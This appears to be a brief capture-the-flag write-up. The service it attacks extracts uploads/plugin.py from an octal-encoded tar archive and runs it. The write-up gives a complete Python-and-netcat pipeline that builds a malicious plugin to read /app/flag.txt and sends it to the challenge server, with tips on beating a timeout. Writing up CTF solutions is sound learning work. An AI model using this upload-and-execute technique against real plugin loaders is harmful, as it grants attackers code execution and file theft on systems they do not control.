
 ![alt text](image.png)

For this challange I noticed that this service requires a tar archive transmitted as a string of octal triplets (3 octal digits per byte), extracts uploads/plugin.py, and calls its run() function. We will use a small plugin that reads /app/flag.txt


This command creates the tar archive in memory, converts it to octal, and immediately sends it to the server:

python3 - <<'PY' | awk 'NF{line=$0} END{print line}' | nc ctf.ac.upt.ro 9300
import io, tarfile
plugin_code = "def run():\n    print(open('/app/flag.txt','rb').read().decode(errors='ignore'))\n"
buf = io.BytesIO()
with tarfile.open(fileobj=buf, mode="w:gz") as tf:
    info = tarfile.TarInfo(name="plugin.py")
    data = plugin_code.encode()
    info.size = len(data)
    tf.addfile(info, io.BytesIO(data))
tar_bytes = buf.getvalue()
octal = "".join(f"{b:03o}" for b in tar_bytes)
print(octal)
PY

warning!! i got a lot of timeouts at the beginning bcz: You must send the entire payload at once (use a pipe with nc or a quick copy-paste) because the server has a 6-second timeout (alarm(6)). This is why gzip compression (w:gz) makes the payload smaller, which helps with the transmission speed